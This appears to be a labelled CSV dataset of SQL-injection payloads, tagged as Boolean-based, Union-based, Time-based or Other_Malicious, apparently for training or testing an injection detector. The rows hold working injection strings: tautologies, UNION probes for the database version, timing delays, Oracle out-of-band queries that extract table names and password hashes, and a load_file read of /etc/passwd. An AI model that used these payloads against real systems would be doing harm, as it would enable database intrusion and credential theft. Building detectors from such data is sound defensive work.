Query,Label,Attack_Type
""" or pg_sleep  (  __TIME__  )  --",1,Time-based
create user name identified by pass123 temporary tablespace temp default tablespace users;,1,Other_Malicious
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,Other_Malicious
" select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1,Union-based
" select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",1,Union-based
 select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,1,Other_Malicious
select * from users where id  =  1 +$+ or 1  =  1 -- 1,1,Boolean-based
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1,Other_Malicious
" select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",1,Union-based
" select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",1,Union-based
? or 1  =  1 --,1,Boolean-based
 )   or   (  'a'  =  'a,1,Other_Malicious
admin' or 1  =  1#,1,Boolean-based
" select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",1,Boolean-based
or 1  =  1 --,1,Other_Malicious
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,Other_Malicious
" select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",1,Union-based
" select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1,Boolean-based
distinct,1,Other_Malicious
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',1,Boolean-based
"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1,Other_Malicious
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,1,Boolean-based
"admin"" or ""1""  =  ""1""--",1,Boolean-based
" select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1,Boolean-based
insert,1,Other_Malicious
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1,Boolean-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,Other_Malicious
" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1,Boolean-based
"or 1  =  1 or """"  =  ",1,Other_Malicious
/**/or/**/1/**/  =  /**/1,1,Other_Malicious
" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1,Union-based
" select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1,Union-based
or 1  =  1/*,1,Other_Malicious
%27 or 1  =  1,1,Boolean-based
" select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1,Union-based
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1,Other_Malicious
" select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1,Union-based
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",1,Union-based
" select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1,Union-based
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1,Boolean-based
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1,Boolean-based
or 1 --',1,Other_Malicious
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1,Boolean-based
"admin"" or 1  =  1#",1,Boolean-based
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1,Union-based
\x27UNION SELECT,1,Other_Malicious
PRINT,1,Other_Malicious
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1,Union-based
or 1  =  1--,1,Other_Malicious
1 or pg_sleep  (  __TIME__  )  --,1,Time-based
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1,Boolean-based
admin'  )   or   (  '1'  =  '1'/*,1,Other_Malicious
or 2 between 1 and 3,1,Other_Malicious
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1,Union-based
admin' or '1'  =  '1,1,Boolean-based
; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,1,Time-based
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,Union-based
""" or 0  =  0 --",1,Boolean-based
" select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1,Union-based
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1,Boolean-based
" select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1,Boolean-based
" select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1,Union-based
" select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1,Boolean-based
char%4039%41%2b%40SELECT,1,Other_Malicious
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1,Boolean-based
admin'  )   or   (  '1'  =  '1,1,Other_Malicious
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1,Other_Malicious
"or 0  =  0 #""",1,Other_Malicious
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1,Boolean-based
  )   or   (  'x'  =  'x,1,Other_Malicious
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1,Union-based
$  (  sleep 50  ) ,1,Other_Malicious
" select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1,Union-based
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1,Union-based
" select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1,Union-based
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1,Boolean-based
"""a"""" or 1  =  1--""",1,Boolean-based
" select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1,Union-based
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,Other_Malicious
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1,Union-based
1 and user_name  (    )     =   'dbo',1,Other_Malicious
